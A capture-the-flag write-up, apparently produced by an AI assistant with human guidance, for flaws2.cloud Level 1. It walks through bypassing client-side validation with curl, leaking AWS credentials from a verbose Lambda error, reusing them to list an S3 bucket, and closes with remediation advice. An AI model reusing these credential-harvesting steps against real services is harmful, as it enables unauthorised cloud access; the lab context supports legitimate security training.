# flaws2.cloud Attacker Path - Level 1 Writeup

**Author:** Claude (Opus 4.5) with human guidance
**Date:** 2025-12-05
**Path:** Attacker
**Challenge URL:** http://level1.flaws2.cloud

## Summary

Level 1 demonstrates a classic serverless security vulnerability: verbose error handling in AWS Lambda that leaks sensitive environment variables, including temporary AWS credentials.

## Reconnaissance

Examining the Level 1 page source revealed an HTML form submitting to an API Gateway endpoint:

```html
<form name="myForm" action="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1" onsubmit="return validateForm()">
    Code: <input type="text" name="code" value="1234">
    <br><br>
    <input type="submit" value="Submit">
</form>
```

Key observations:
- Client-side JavaScript validation (`validateForm()`) before submission
- API Gateway endpoint in us-east-1 region
- Expects a numeric code parameter

## Vulnerability Discovery

The client-side validation only allows numeric input. However, by using `curl` to call the API directly, we can bypass this validation and send arbitrary input.

### Exploitation Command

```bash
curl "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=test"
```

### Result

The Lambda function crashed when processing non-numeric input, and the error handler exposed the entire environment variables:

```
Error, malformed input
{"AWS_LAMBDA_INITIALIZATION_TYPE":"on-demand","AWS_REGION":"us-east-1",...
"AWS_ACCESS_KEY_ID":"ASIAZQNB3KHGF[REDACTED]",
"AWS_SECRET_ACCESS_KEY":"[REDACTED]",
"AWS_SESSION_TOKEN":"[REDACTED]",
...
"AWS_LAMBDA_FUNCTION_NAME":"level1",...}
```

## Credential Usage

With the leaked credentials, we confirmed our identity and enumerated accessible resources:

```bash
# Set credentials
export AWS_ACCESS_KEY_ID=ASIAZQNB3KHGF[REDACTED]
export AWS_SECRET_ACCESS_KEY=[REDACTED]
export AWS_SESSION_TOKEN=[REDACTED]

# Verify identity
aws sts get-caller-identity
```

Output:
```json
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

## Flag Retrieval

The Lambda execution role had permissions to list and read from the S3 bucket:

```bash
aws s3 ls s3://level1.flaws2.cloud/
```

Output:
```
PRE img/
2018-11-20 20:55:05      17102 favicon.ico
2018-11-21 02:00:22       1905 hint1.htm
2018-11-21 02:00:22       2226 hint2.htm
2018-11-21 02:00:22       2536 hint3.htm
2018-11-21 02:00:23       2460 hint4.htm
2018-11-21 02:00:17       3000 index.htm
2018-11-21 02:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```

Retrieving the secret file revealed the path to Level 2:
```
http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
```

## Vulnerabilities Exploited

1. **Client-side only validation** - The form relied solely on JavaScript validation, which is trivially bypassed
2. **Verbose error handling** - The Lambda function exposed its entire runtime environment on error
3. **Overly permissive IAM role** - The Lambda execution role had S3 read access that wasn't strictly necessary for its function

## Remediation Recommendations

1. **Server-side input validation** - Always validate and sanitize input on the backend
2. **Secure error handling** - Never expose environment variables, stack traces, or internal details in error responses
3. **Least privilege IAM** - Lambda execution roles should only have permissions strictly required for their function
4. **Error monitoring** - Use structured logging (CloudWatch) rather than returning errors to clients

## Lessons Learned

- Never trust client-side validation alone
- AWS Lambda environment variables contain sensitive credentials by default
- Error messages can be a significant source of information disclosure
- Always assume attackers will bypass client-side controls

---

*Writeup by Claude (Opus 4.5), Anthropic's AI assistant, working through the flaws2.cloud CTF with human collaboration.*
